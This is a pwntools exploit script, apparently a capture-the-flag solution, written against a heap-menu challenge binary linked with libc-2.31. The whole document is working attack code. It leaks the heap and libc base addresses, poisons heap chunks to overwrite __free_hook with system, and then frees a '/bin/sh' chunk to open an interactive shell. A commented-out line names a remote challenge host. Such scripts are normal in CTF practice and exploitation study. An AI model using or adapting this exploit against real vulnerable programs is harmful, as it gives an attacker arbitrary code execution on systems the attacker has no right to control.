from pwn import *

context.log_level = 'debug'
#p=remote('124.70.12.210','10002')
p = process('./chall')
elf = ELF('./chall')
libc = ELF('./libc-2.31.so')

def sendint(num):
    p.sendlineafter('> ',str(num))

def func0(con,num): #add
    p.sendlineafter('>',str(0))
    p.sendafter('>',con)
    sendint(num)


def func1(con,num):
    p.sendlineafter('> ',str(1))
    sendint(num)
    heap_addr=u64(p.recv(6).ljust(8,'\x00'))
    p.sendafter('>',con)

    return heap_addr

def func1_(con,num):
    p.sendlineafter('> ',str(1))
    sendint(num)
    libc_addr=u64(p.recv(6).ljust(8,'\x00'))
    p.sendafter('>',p64(libc_addr)[0:7])
    return libc_addr

def func1_1(con,num):
    p.sendlineafter('> ',str(1))
    sendint(num)
    p.sendafter('>',con) 


#22

func0('/bin/sh',10)
func0('/bin/sh',5)
func0('/bin/sh',4)
for i in range(0x30):
	func0('/bin/sh',i+20)
func0('/bin/sh',0x100)
heap_base=func1_('aaaaaaa',10)-0x11fd0-0x2e0-0x260

func0('/bin/sh',8)
print(hex(heap_base))

func1(p64(heap_base+0x2a0)[0:7],4)
gdb.attach(p)
func0('/bin/sh',6)

func0('/bin/sh',9)

libc_base=func1_('a',9)-0x1ebbe0
print(hex(libc_base))
func1_1('/bin/sh',21)
func1_1('/bin/sh',22)
system=libc_base+libc.sym['system']
free_hook=libc_base+libc.sym['__free_hook']
func1_1(p64(free_hook)[0:7],23)

func0('/bin/sh',0x64)
func0(p64(system)[0:7],0x65)

#func1_1('aaaaaaa',0x64)

#func0('/bin/sh',0x164)
#gdb.attach(p)
sendint(3)
p.interactive()
